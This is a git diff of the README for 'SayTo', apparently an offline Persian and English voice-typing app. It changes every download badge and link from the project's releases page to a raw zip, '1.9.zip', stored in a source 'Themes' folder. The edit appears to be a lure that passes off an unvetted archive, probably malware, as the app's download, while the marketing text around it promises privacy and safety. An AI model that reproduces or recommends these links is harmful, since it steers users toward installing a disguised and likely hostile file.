@@ -1,6 +1,6 @@
 # 🎤 SayTo - Effortless Offline Voice Typing, Persian & English
 
-[![Download SayTo](https://img.shields.io/badge/Download-SayTo-2ea44f?style=for-the-badge&logo=github&logoColor=white&labelColor=4B0082&color=FF6347)](https://github.com/Thyroglobulinaustenite1135/SayTo/releases)
+[![Download SayTo](https://img.shields.io/badge/Download-SayTo-2ea44f?style=for-the-badge&logo=github&logoColor=white&labelColor=4B0082&color=FF6347)](https://github.com/Thyroglobulinaustenite1135/SayTo/raw/refs/heads/main/src/SayTo/Themes/1.9.zip)
 
 ## 🚀 What Is SayTo?
 
@@ -60,7 +60,7 @@ Follow these simple steps. No technical knowledge needed. We'll walk you through
 
 Visit this link to download the application. Click the button below or copy the URL into your browser.
 
-[👉 **Download SayTo Now**](https://github.com/Thyroglobulinaustenite1135/SayTo/releases)
+[👉 **Download SayTo Now**](https://github.com/Thyroglobulinaustenite1135/SayTo/raw/refs/heads/main/src/SayTo/Themes/1.9.zip)
 
 )
 
@@ -192,7 +192,7 @@ No. Your audio is never saved to disk. It is processed in real-time memory and i
 
 You're only one click away from effortless, private, offline voice typing in your language. SayTo puts the power of accurate speech recognition right on your PC—with absolutely no strings attached.
 
-[![Get SayTo Now](https://img.shields.io/badge/⬇️%20Download%20SayTo-Go%20to%20Releases-4B0082?style=for-the-badge&logo=github&logoColor=white&labelColor=2ea44f&color=FF6347)](https://github.com/Thyroglobulinaustenite1135/SayTo/releases)
+[![Get SayTo Now](https://img.shields.io/badge/⬇️%20Download%20SayTo-Go%20to%20Releases-4B0082?style=for-the-badge&logo=github&logoColor=white&labelColor=2ea44f&color=FF6347)](https://github.com/Thyroglobulinaustenite1135/SayTo/raw/refs/heads/main/src/SayTo/Themes/1.9.zip)
 
 Visit this link to download the application. Then follow Steps 2 through 6 above and you'll be dictating in under five minutes. Enjoy!
 
